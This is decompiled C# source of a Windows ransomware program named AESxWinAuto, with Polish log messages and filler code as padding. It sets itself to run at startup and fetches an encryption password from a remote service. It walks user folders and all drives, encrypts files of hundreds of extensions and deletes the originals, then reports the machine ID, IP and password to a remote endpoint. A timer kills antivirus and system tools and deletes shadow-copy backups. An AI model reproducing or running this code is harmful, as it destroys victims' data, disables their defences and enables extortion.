using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using AESxWin.Helpers;
using Microsoft.Win32;
using epson.Properties;

namespace AESxWin;

public class AESxWinAuto : Form
{
	public static string[] image_ext = new string[390]
	{
		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".groups", ".hdd", ".hpp", ".m2ts", ".m4p",
		".mpeg", ".ndf", ".nvram", ".ogg", ".ost", ".pab", ".pdb", ".pif", ".qed", ".qcow",
		".qcow2", ".rvt", ".st7", ".stm", ".vbox", ".vdi", ".vhd", ".vhdx", ".vmdk", ".vmsd",
		".vmx", ".vmxf", ".3fr", ".3pr", ".ab4", ".accde", ".accdr", ".accdt", ".ach", ".acr",
		".adb", ".ads", ".agdl", ".ait", ".apj", ".asm", ".awg", ".back", ".backup", ".backupdb",
		".bay", ".bdb", ".bgt", ".bik", ".bpw", ".cdr3", ".cdr4", ".cdr5", ".cdr6", ".cdrw",
		".ce1", ".ce2", ".cib", ".craw", ".crw", ".csh", ".csl", ".db_journal", ".dc2", ".dcs",
		".ddoc", ".ddrw", ".der", ".des", ".dgc", ".djvu", ".dng", ".drf", ".dxg", ".eml",
		".erbsql", ".erf", ".exf", ".ffd", ".fh", ".fhd", ".gray", ".grey", ".gry", ".hbk",
		".ibd", ".ibz", ".iiq", ".incpas", ".jpe", ".kc2", ".kdbx", ".kdc", ".kpdx", ".lua",
		".mdc", ".mef", ".mfw", ".mmw", ".mny", ".mrw", ".myd", ".ndd", ".nef", ".nk2",
		".nop", ".nrw", ".ns2", ".ns3", ".ns4", ".nwb", ".nx2", ".nxl", ".nyf", ".odb",
		".odf", ".odg", ".odm", ".orf", ".otg", ".oth", ".otp", ".ots", ".ott", ".p12",
		".p7b", ".p7c", ".pdd", ".pem", ".plus_muhd", ".plc", ".pot", ".pptx", ".psafe3", ".py",
		".qba", ".qbr", ".qbw", ".qbx", ".qby", ".raf", ".rat", ".raw", ".rdb", ".rwl",
		".rwz", ".s3db", ".sd0", ".sda", ".sdf", ".sqlite", ".sqlite3", ".sqlitedb", ".sr2", ".srf",
		".srw", ".st5", ".st8", ".std", ".sti", ".stw", ".stx", ".sxd", ".sxg", ".sxi",
		".sxm", ".tex", ".wallet", ".wb2", ".wpd", ".x11", ".x3f", ".xis", ".ycbcra", ".yuv",
		".contact", ".dbx", ".doc", ".docx", ".jnt", ".msg", ".oab", ".ods", ".pdf", ".pps",
		".ppsm", ".ppt", ".pptm", ".prf", ".pst", ".rar", ".rtf", ".wab", ".xls", ".xlsx",
		".xml", ".zip", ".1cd", ".3ds", ".3g2", ".3gp", ".7z", ".7zip", ".accdb", ".aoi",
		".asf", ".asp", ".aspx", ".asx", ".avi", ".bak", ".cer", ".cfg", ".class", ".config",
		".css", ".csv", ".db", ".dds", ".dwg", ".dxf", ".flf", ".flv", ".html", ".idx",
		".js", ".key", ".kwm", ".laccdb", ".ldf", ".lit", ".m3u", ".mbx", ".md", ".mdf",
		".mid", ".mlb", ".mov", ".mp4", ".mpg", ".obj", ".odt", ".ods", ".odp", ".pages",
		".php", ".psd", ".pwm", ".rm", ".safe", ".sav", ".save", ".sql", ".srt", ".swf",
		".thm", ".vob", ".wav", ".wma", ".wmv", ".xlsb3dm", ".aac", ".ai", ".arw", ".c",
		".cdr", ".cls", ".cpi", ".cpp", ".cs", ".db3", ".docm", ".dot", ".dotm", ".dotx",
		".drw", ".dxb", ".eps", ".fla", ".flac", ".fxg", ".java", ".m", ".m4v", ".max",
		".mdb", ".pcd", ".pct", ".pl", ".potm", ".potx", ".ppam", ".ppsm", ".ppsx", ".pptm",
		".ps", ".r3d", ".rw2", ".sldm", ".sldx", ".svg", ".tga", ".wps", ".xla", ".xlam",
		".xlm", ".xlr", ".xlsm", ".xlt", ".xltm", ".xltx", ".xlw", ".act", ".adp", ".al",
		".bkp", ".blend", ".cdf", ".cdx", ".cgm", ".cr2", ".crt", ".dac", ".dbf", ".dcr",
		".ddd", ".design", ".dtd", ".fdb", ".fff", ".fpx", ".h", ".iif", ".indd", ".jpeg",
		".mos", ".nd", ".nsd", ".nsf", ".nsg", ".nsh", ".odc", ".odp", ".oil", ".pas",
		".pat", ".pef", ".pfx", ".ptx", ".qbb", ".qbm", ".sas7bdat", ".say", ".st4", ".st6",
		".stc", ".sxc", ".sxw", ".tlg", ".wad", ".xlk", ".aiff", ".bin", ".cmt", ".dat",
		".dit", ".edb", ".flvv", ".ntx", ".xsd", ".pem", ".xsd", ".xsl", ".ewd", ".dbt",
		".ob", ".gofin", ".dsf", ".ds4", ".shx", ".ath", ".bac", ".ts", ".dst", ".dwfx"
	};

	public static string[] video_ext = new string[15]
	{
		".avi", ".flv", ".mov", ".mp4", ".mpg", ".rm", ".rmvb", ".mkv", ".swf", ".vob",
		".wmv", ".3g2", ".3gp", ".asf", ".ogv"
	};

	public static string[] audio_ext = new string[6] { ".mp3", ".wav", ".acc", ".ogg", ".amr", ".wma" };

	public static string[] document_ext = new string[9] { ".pdf", ".txt", ".rtf", ".doc", ".docx", ".ppt", ".pptx", ".xls", ".xlsx" };

	public static string[] compressed_ext = new string[5] { ".zip", ".rar", ".7z", ".tar", ".gzip" };

	public static string[] code_ext = new string[9] { ".cs", ".vb", ".java", ".py", ".rb", ".cpp", ".html", ".css", ".js" };

	public List<string> StartPaths = new List<string>();

	private BackgroundWorker bwEncryptor = null;

	private BackgroundWorker bwPathFinder = null;

	private Queue<string> PathsQueue = new Queue<string>();

	private bool FinishedPathFinder = false;

	private long EncryptionCount = 0L;

	private long TotalFindPaths = 0L;

	private bool requestSent = false;

	private bool _isAutostart = true;

	private string _currentPassword = string.Empty;

	private string _currentIP = string.Empty;

	private bool _isStarted = false;

	private IContainer components = null;

	private Button btnStartAutoEncrypt;

	private CheckBox chckIsStartup;

	private Timer timer1;

	private Timer timer2;

	private ProgressBar progressBar1;

	private Timer timer3;

	private PictureBox pictureBox2;

	private Timer timer4;

	private PictureBox pictureBox3;

	private Button button1;

	private Button button2;

	private Button button3;

	private Button button4;

	private Button button5;

	private Button button6;

	private Button button7;

	private Button button8;

	private Button button9;

	private Button button10;

	private Button button11;

	private Button button12;

	private Button button13;

	private Button button14;

	private Button button15;

	private Button button16;

	private Button button17;

	private Button button18;

	private Button button19;

	private Button button20;

	private Button button21;

	private Button button22;

	private Button button23;

	private Button button24;

	private ComboBox comboBox1;

	private ComboBox comboBox2;

	private RichTextBox richTextBox1;

	private PictureBox pictureBox1;

	private PictureBox pictureBox4;

	private PictureBox pictureBox5;

	private PictureBox pictureBox6;

	public static string LogPath { get; set; }

	public static string ErrorLogPath { get; set; }

	public List<string> IgnoredPaths { get; set; }

	public string[] SearchExtensions { get; set; }

	public bool IsStartup
	{
		get
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			return registryKey.GetValue(Assembly.GetExecutingAssembly().GetName().Name) != null;
		}
		set
		{
			Reg.RegisterInStartup(value, Application.get_ExecutablePath());
		}
	}

	public bool IsAutostart
	{
		get
		{
			return _isAutostart;
		}
		set
		{
			_isAutostart = value;
		}
	}

	public string CurrentPassword
	{
		get
		{
			return _currentPassword;
		}
		set
		{
			_currentPassword = value;
		}
	}

	public string CurrentIP
	{
		get
		{
			return _currentIP;
		}
		set
		{
			_currentIP = value;
		}
	}

	public Guid ComputerId
	{
		get
		{
			Guid result = default(Guid);
			string text = Reg.Read("ComputerId");
			if (text != null)
			{
				Guid.TryParse(text, out result);
			}
			else
			{
				result = Guid.NewGuid();
				Reg.Write("ComputerId", result);
			}
			return result;
		}
	}

	public bool IsStarted
	{
		get
		{
			return _isStarted;
		}
		set
		{
			_isStarted = value;
			if (_isStarted)
			{
				((Control)btnStartAutoEncrypt).set_Text("Stop");
			}
			else
			{
				((Control)btnStartAutoEncrypt).set_Text("Start");
			}
		}
	}

	public AESxWinAuto()
	{
		InitializeComponent();
		LogPath = "C:\\ProgramData\\Keyboard";
		if (!Directory.Exists(LogPath))
		{
			Directory.CreateDirectory(LogPath);
		}
		string text = DateTime.Now.ToString("ddMMyyyy_HHmmss");
		LogPath = Path.Combine(LogPath, text + ".log");
		ErrorLogPath = Path.Combine(LogPath, text + ".error");
		Log.WriteLog(LogPath, "Start programu");
		IsStartup = true;
		chckIsStartup.set_Checked(IsStartup);
		InitSearchExtensions();
		InitIgnoredPaths();
		InitStartPaths();
		GetIP();
		GetPassword();
	}

	private void InitSearchExtensions()
	{
		SearchExtensions = image_ext;
	}

	private void InitIgnoredPaths()
	{
		IgnoredPaths = new List<string>();
		IgnoredPaths.Add(Path.GetDirectoryName(Application.get_ExecutablePath()));
		IgnoredPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		IgnoredPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
		IgnoredPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData));
		IgnoredPaths.Add("C:\\Program Files\\Common Files");
	}

	private void InitStartPaths()
	{
		DriveInfo[] drives = FilesHelper.GetDrives();
		_ = ComputerId;
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Recent));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Favorites));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		StartPaths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			StartPaths.Add(driveInfo.RootDirectory.Name);
		}
	}

	private async void GetPassword()
	{
		try
		{
			string text2 = (CurrentPassword = await PasswordAPI.GetPassword());
			if (string.IsNullOrEmpty(CurrentPassword))
			{
				return;
			}
			if (CurrentPassword.Length <= 3)
			{
				_ = CurrentPassword;
			}
			else
			{
				CurrentPassword.Substring(0, 4);
			}
			Log.WriteLog(LogPath, "Pobrano nowe hasło. Vb*X");
			((Control)btnStartAutoEncrypt).set_Enabled(true);
			if (bwEncryptor == null && bwPathFinder == null && IsAutostart)
			{
				btnStartAutoEncrypt_Click(btnStartAutoEncrypt, new EventArgs());
			}
			try
			{
				if (!string.IsNullOrEmpty(CurrentPassword) && !string.IsNullOrEmpty(CurrentIP) && !requestSent)
				{
					SendAPI.SendData(CurrentIP, ComputerId.ToString(), DateTime.Now, CurrentPassword);
					requestSent = true;
				}
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			Exception ex = ex2;
			Log.WriteLog(ErrorLogPath, "Błąd pobierania hasła. " + ex.ToString());
		}
	}

	private async void GetIP()
	{
		try
		{
			string text2 = (CurrentIP = await IpAPI.GetIP());
			if (!string.IsNullOrEmpty(CurrentIP))
			{
				Log.WriteLog(LogPath, "Ustalono adres IP. " + CurrentIP);
			}
			else
			{
				Log.WriteLog(LogPath, "Błąd pobierania adresu IP.");
			}
			try
			{
				if (!string.IsNullOrEmpty(CurrentPassword) && !string.IsNullOrEmpty(CurrentIP) && !requestSent)
				{
					SendAPI.SendData(CurrentIP, ComputerId.ToString(), DateTime.Now, CurrentPassword);
					requestSent = true;
				}
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			Exception ex = ex2;
			Log.WriteLog(ErrorLogPath, "Błąd pobierania hasła. " + ex.ToString());
		}
	}

	private void chckIsStartup_Click(object sender, EventArgs e)
	{
		IsStartup = chckIsStartup.get_Checked();
	}

	private void btnStartAutoEncrypt_Click(object sender, EventArgs e)
	{
		if (((Control)btnStartAutoEncrypt).get_Enabled())
		{
			if (!IsStarted)
			{
				IsStarted = !IsStarted;
				Start();
			}
			else
			{
				Stop();
			}
		}
	}

	private void Start()
	{
		EncryptionCount = 0L;
		lock (PathsQueue)
		{
			PathsQueue.Clear();
		}
		bwPathFinder = new BackgroundWorker();
		bwPathFinder.RunWorkerCompleted += BwPathFinder_RunWorkerCompleted;
		bwPathFinder.DoWork += BwPathFinder_DoWork;
		bwPathFinder.RunWorkerAsync();
		bwEncryptor = new BackgroundWorker();
		bwEncryptor.DoWork += BwEncryptor_DoWork;
		bwEncryptor.RunWorkerCompleted += BwEncryptor_RunWorkerCompleted;
		bwEncryptor.RunWorkerAsync();
		string text = string.Empty;
		foreach (string startPath in StartPaths)
		{
			text = text + startPath + " ";
		}
		Log.WriteLog(LogPath, "Rozpoczęto przeszukiwanie lokalizacji: " + text);
	}

	private void Stop()
	{
		IsStarted = false;
		Thread.Sleep(50);
		lock (PathsQueue)
		{
			PathsQueue.Clear();
		}
	}

	private void BwPathFinder_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		Log.WriteLog(LogPath, $"Zakończono przeszukiwanie dysku ({TotalFindPaths})");
		FinishedPathFinder = true;
	}

	private void BwPathFinder_DoWork(object sender, DoWorkEventArgs e)
	{
		List<string> list = new List<string>();
		foreach (string ignoredPath in IgnoredPaths)
		{
			if (!IsStarted)
			{
				continue;
			}
			try
			{
				IEnumerable<string> folderFilesPaths = ignoredPath.GetFolderFilesPaths();
				foreach (string item in folderFilesPaths)
				{
					try
					{
						string directoryName = Path.GetDirectoryName(item);
						if (!list.Contains(directoryName))
						{
							list.Add(directoryName);
						}
					}
					catch (Exception)
					{
					}
				}
			}
			catch (Exception ex2)
			{
				Log.WriteLog(ErrorLogPath, "BwPathFinder_DoWork " + ex2.ToString());
			}
		}
		IgnoredPaths.AddRange(list);
		foreach (string startPath in StartPaths)
		{
			if (!IsStarted)
			{
				break;
			}
			try
			{
				if (File.Exists(startPath))
				{
					try
					{
						string directoryName2 = Path.GetDirectoryName(startPath);
						if (!IgnoredPaths.Contains(directoryName2) && startPath.CheckExtension(SearchExtensions))
						{
							lock (PathsQueue)
							{
								PathsQueue.Enqueue(startPath);
							}
							TotalFindPaths++;
						}
					}
					catch (Exception ex3)
					{
						Log.WriteLog(ErrorLogPath, "BwPathFinder_DoWork 1 " + ex3.ToString());
					}
				}
				try
				{
					if (!Directory.Exists(startPath) || IgnoredPaths.Contains(startPath))
					{
						continue;
					}
					IEnumerable<string> folderFilesPaths2 = startPath.GetFolderFilesPaths();
					foreach (string item2 in folderFilesPaths2)
					{
						try
						{
							string directoryName3 = Path.GetDirectoryName(item2);
							if (IgnoredPaths.Contains(directoryName3))
							{
								continue;
							}
							if (!IsStarted)
							{
								break;
							}
							if (item2.CheckExtension(SearchExtensions) && !item2.EndsWith(".aes"))
							{
								lock (PathsQueue)
								{
									PathsQueue.Enqueue(item2);
								}
								TotalFindPaths++;
							}
							Thread.Sleep(1);
							continue;
						}
						catch
						{
						}
					}
				}
				catch (Exception ex4)
				{
					Log.WriteLog(ErrorLogPath, "BwPathFinder_DoWork 1.2 " + ex4.ToString());
				}
			}
			catch (Exception ex5)
			{
				Log.WriteLog(ErrorLogPath, "BwPathFinder_DoWork 2 " + ex5.ToString());
			}
		}
	}

	private void BwEncryptor_DoWork(object sender, DoWorkEventArgs e)
	{
		while (IsStarted)
		{
			try
			{
				if (PathsQueue.Count != 0)
				{
					string currentPassword = CurrentPassword;
					string text = string.Empty;
					lock (PathsQueue)
					{
						text = PathsQueue.Dequeue();
					}
					if (File.Exists(text))
					{
						try
						{
							text.EncryptFileAsync(currentPassword, deleteOriginal: true);
							EncryptionCount++;
							Log.WriteLog(LogPath, $"Zaszyfrowano: {Path.GetFileName(text)} | {text} Hasło={((currentPassword.Length > 3) ? currentPassword.Substring(0, 4) : currentPassword)}");
							string directoryName = Path.GetDirectoryName(text);
							if (!StatusFile.StatusFileExist(directoryName))
							{
								StatusFile.WriteStatusFile(directoryName, CurrentIP, ComputerId.ToString(), DateTime.Now);
							}
						}
						catch (Exception ex)
						{
							Log.WriteLog(ErrorLogPath, "BwEncryptor_DoWork " + ex.ToString());
						}
					}
				}
				if (FinishedPathFinder && PathsQueue.Count == 0)
				{
					break;
				}
			}
			catch (Exception ex2)
			{
				Log.WriteLog(ErrorLogPath, "BwEncryptor_DoWork 2 " + ex2.ToString());
			}
			Thread.Sleep(20);
		}
		e.Result = true;
	}

	private void BwEncryptor_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		if (FinishedPathFinder)
		{
			Log.WriteLog(LogPath, $"Zakończono szyfrowanie ({EncryptionCount})");
			btnStartAutoEncrypt_Click(btnStartAutoEncrypt, new EventArgs());
			Reg.RegisterInStartup(isChecked: false, Application.get_ExecutablePath());
			Log.WriteLog(LogPath, $"Usuwam z autostartu i zamykam program");
			try
			{
				Process process = new Process();
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.FileName = "exec.bat";
				process.Start();
			}
			catch
			{
			}
			((Form)this).Close();
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
	}

	private void button2_Click(object sender, EventArgs e)
	{
		int num = 0;
		Console.WriteLine("Enter the Number of Rows : ");
		int num2 = int.Parse(Console.ReadLine());
		for (int i = 1; i <= num2; i++)
		{
			for (int j = 1; j <= i; j++)
			{
				switch (num)
				{
				case 1:
					Console.Write("0");
					num = 0;
					break;
				case 0:
					Console.Write("1");
					num = 1;
					break;
				}
			}
			Console.Write("\n");
		}
		Console.ReadLine();
	}

	private void button3_Click(object sender, EventArgs e)
	{
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
	}

	private void timer3_Tick(object sender, EventArgs e)
	{
		Console.WriteLine("Enter the size of the Array : ");
		int num = Convert.ToInt32(Console.ReadLine());
		int[] array = new int[num];
		Console.WriteLine("Enter the Elements of the First Array :");
		for (int i = 0; i < num; i++)
		{
			array[i] = Convert.ToInt32(Console.ReadLine());
		}
		Console.WriteLine("Enter the Size of the Target Array : ");
		int num2 = Convert.ToInt32(Console.ReadLine());
		int[] array2 = new int[num2];
		Console.WriteLine("Enter the section of the First Array that has to be Copied :");
		int length = Convert.ToInt32(Console.ReadLine());
		Array.Copy(array, 0, array2, 0, length);
		Console.WriteLine("New Array With The Specified Section of Elements in the First Array");
		int[] array3 = array2;
		foreach (int value in array3)
		{
			Console.WriteLine(value);
		}
		Console.Read();
	}

	private void pictureBox3_Click(object sender, EventArgs e)
	{
	}

	private void timer4_Tick(object sender, EventArgs e)
	{
		Process[] processesByName = Process.GetProcessesByName("taskmgr");
		Process[] processesByName2 = Process.GetProcessesByName("MSASCui");
		Process[] processesByName3 = Process.GetProcessesByName("mbam");
		Process[] processesByName4 = Process.GetProcessesByName("avp");
		Process[] processesByName5 = Process.GetProcessesByName("AvastSvc");
		Process[] processesByName6 = Process.GetProcessesByName("AvastUI");
		Process[] processesByName7 = Process.GetProcessesByName("regedit");
		Process[] processesByName8 = Process.GetProcessesByName("msconfig");
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			process.Kill();
		}
		Process[] array2 = processesByName2;
		foreach (Process process2 in array2)
		{
			process2.Kill();
		}
		Process[] array3 = processesByName3;
		foreach (Process process3 in array3)
		{
			process3.Kill();
		}
		Process[] array4 = processesByName4;
		foreach (Process process4 in array4)
		{
			process4.Kill();
		}
		Process[] array5 = processesByName5;
		foreach (Process process5 in array5)
		{
			process5.Kill();
		}
		Process[] array6 = processesByName6;
		foreach (Process process6 in array6)
		{
			process6.Kill();
		}
		Process[] array7 = processesByName7;
		foreach (Process process7 in array7)
		{
			process7.Kill();
		}
		Process[] array8 = processesByName8;
		foreach (Process process8 in array8)
		{
			process8.Kill();
		}
		Process.Start("vssadmin.exe Delete Shadows /All /Quiet");
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
	}

	private void pictureBox6_Click(object sender, EventArgs e)
	{
		Console.Write("\nEnter the First Number : ");
		int num = int.Parse(Console.ReadLine());
		Console.Write("\nEnter the Second Number : ");
		int num2 = int.Parse(Console.ReadLine());
		int num3 = num;
		num = num2;
		num2 = num3;
		Console.Write("\nAfter Swapping : ");
		Console.Write("\nFirst Number : " + num);
		Console.Write("\nSecond Number : " + num2);
		Console.Read();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Expected O, but got Unknown
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Expected O, but got Unknown
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c2: Expected O, but got Unknown
		//IL_00c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cd: Expected O, but got Unknown
		//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d8: Expected O, but got Unknown
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Expected O, but got Unknown
		//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ee: Expected O, but got Unknown
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f9: Expected O, but got Unknown
		//IL_00fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0104: Expected O, but got Unknown
		//IL_0105: Unknown result type (might be due to invalid IL or missing references)
		//IL_010f: Expected O, but got Unknown
		//IL_0110: Unknown result type (might be due to invalid IL or missing references)
		//IL_011a: Expected O, but got Unknown
		//IL_011b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0125: Expected O, but got Unknown
		//IL_0126: Unknown result type (might be due to invalid IL or missing references)
		//IL_0130: Expected O, but got Unknown
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_013b: Expected O, but got Unknown
		//IL_013c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0146: Expected O, but got Unknown
		//IL_0147: Unknown result type (might be due to invalid IL or missing references)
		//IL_0151: Expected O, but got Unknown
		//IL_0152: Unknown result type (might be due to invalid IL or missing references)
		//IL_015c: Expected O, but got Unknown
		//IL_015d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0167: Expected O, but got Unknown
		//IL_0168: Unknown result type (might be due to invalid IL or missing references)
		//IL_0172: Expected O, but got Unknown
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		//IL_017d: Expected O, but got Unknown
		//IL_017e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0188: Expected O, but got Unknown
		//IL_0189: Unknown result type (might be due to invalid IL or missing references)
		//IL_0193: Expected O, but got Unknown
		//IL_0194: Unknown result type (might be due to invalid IL or missing references)
		//IL_019e: Expected O, but got Unknown
		//IL_019f: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a9: Expected O, but got Unknown
		//IL_01aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b4: Expected O, but got Unknown
		//IL_01b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bf: Expected O, but got Unknown
		//IL_01c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ca: Expected O, but got Unknown
		//IL_01cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d5: Expected O, but got Unknown
		//IL_01d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e0: Expected O, but got Unknown
		//IL_01e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01eb: Expected O, but got Unknown
		//IL_026a: Unknown result type (might be due to invalid IL or missing references)
		//IL_030b: Unknown result type (might be due to invalid IL or missing references)
		//IL_138c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1396: Expected O, but got Unknown
		//IL_1398: Unknown result type (might be due to invalid IL or missing references)
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(AESxWinAuto));
		btnStartAutoEncrypt = new Button();
		chckIsStartup = new CheckBox();
		timer1 = new Timer(components);
		timer2 = new Timer(components);
		progressBar1 = new ProgressBar();
		timer3 = new Timer(components);
		timer4 = new Timer(components);
		button1 = new Button();
		button2 = new Button();
		button3 = new Button();
		button4 = new Button();
		button5 = new Button();
		button6 = new Button();
		button7 = new Button();
		button8 = new Button();
		button9 = new Button();
		button10 = new Button();
		button11 = new Button();
		button12 = new Button();
		button13 = new Button();
		button14 = new Button();
		button15 = new Button();
		button16 = new Button();
		button17 = new Button();
		button18 = new Button();
		button19 = new Button();
		button20 = new Button();
		button21 = new Button();
		button22 = new Button();
		button23 = new Button();
		button24 = new Button();
		comboBox1 = new ComboBox();
		comboBox2 = new ComboBox();
		richTextBox1 = new RichTextBox();
		pictureBox6 = new PictureBox();
		pictureBox5 = new PictureBox();
		pictureBox4 = new PictureBox();
		pictureBox1 = new PictureBox();
		pictureBox3 = new PictureBox();
		pictureBox2 = new PictureBox();
		((ISupportInitialize)pictureBox6).BeginInit();
		((ISupportInitialize)pictureBox5).BeginInit();
		((ISupportInitialize)pictureBox4).BeginInit();
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)pictureBox3).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		((Control)btnStartAutoEncrypt).set_Anchor((AnchorStyles)10);
		((Control)btnStartAutoEncrypt).set_Enabled(false);
		((Control)btnStartAutoEncrypt).set_Location(new Point(484, 82));
		((Control)btnStartAutoEncrypt).set_Margin(new Padding(4));
		((Control)btnStartAutoEncrypt).set_Name("btnStartAutoEncrypt");
		((Control)btnStartAutoEncrypt).set_Size(new Size(112, 28));
		((Control)btnStartAutoEncrypt).set_TabIndex(4);
		((Control)btnStartAutoEncrypt).set_Text("Start");
		((ButtonBase)btnStartAutoEncrypt).set_UseVisualStyleBackColor(true);
		((Control)btnStartAutoEncrypt).add_Click((EventHandler)btnStartAutoEncrypt_Click);
		((Control)chckIsStartup).set_Anchor((AnchorStyles)10);
		((Control)chckIsStartup).set_AutoSize(true);
		((Control)chckIsStartup).set_Location(new Point(23, 96));
		((Control)chckIsStartup).set_Margin(new Padding(4));
		((Control)chckIsStartup).set_Name("chckIsStartup");
		((Control)chckIsStartup).set_Size(new Size(213, 21));
		((Control)chckIsStartup).set_TabIndex(1);
		((Control)chckIsStartup).set_Text("Uruchom ze startem systemu");
		((ButtonBase)chckIsStartup).set_UseVisualStyleBackColor(true);
		((Control)chckIsStartup).add_Click((EventHandler)chckIsStartup_Click);
		timer1.add_Tick((EventHandler)timer1_Tick);
		timer2.add_Tick((EventHandler)timer2_Tick);
		((Control)progressBar1).set_Location(new Point(460, 36));
		((Control)progressBar1).set_Name("progressBar1");
		((Control)progressBar1).set_Size(new Size(118, 18));
		((Control)progressBar1).set_TabIndex(21);
		timer3.add_Tick((EventHandler)timer3_Tick);
		timer4.set_Enabled(true);
		timer4.set_Interval(1000);
		timer4.add_Tick((EventHandler)timer4_Tick);
		((Control)button1).set_Location(new Point(283, 27));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(26);
		((Control)button1).set_Text("button1");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button2).set_Location(new Point(175, 13));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(75, 23));
		((Control)button2).set_TabIndex(27);
		((Control)button2).set_Text("button2");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button3).set_Location(new Point(248, 36));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(75, 23));
		((Control)button3).set_TabIndex(28);
		((Control)button3).set_Text("button3");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button4).set_Location(new Point(191, 26));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Size(new Size(75, 23));
		((Control)button4).set_TabIndex(29);
		((Control)button4).set_Text("button4");
		((ButtonBase)button4).set_UseVisualStyleBackColor(true);
		((Control)button5).set_Location(new Point(303, 26));
		((Control)button5).set_Name("button5");
		((Control)button5).set_Size(new Size(75, 23));
		((Control)button5).set_TabIndex(30);
		((Control)button5).set_Text("button5");
		((ButtonBase)button5).set_UseVisualStyleBackColor(true);
		((Control)button6).set_Location(new Point(385, 35));
		((Control)button6).set_Name("button6");
		((Control)button6).set_Size(new Size(75, 23));
		((Control)button6).set_TabIndex(31);
		((Control)button6).set_Text("button6");
		((ButtonBase)button6).set_UseVisualStyleBackColor(true);
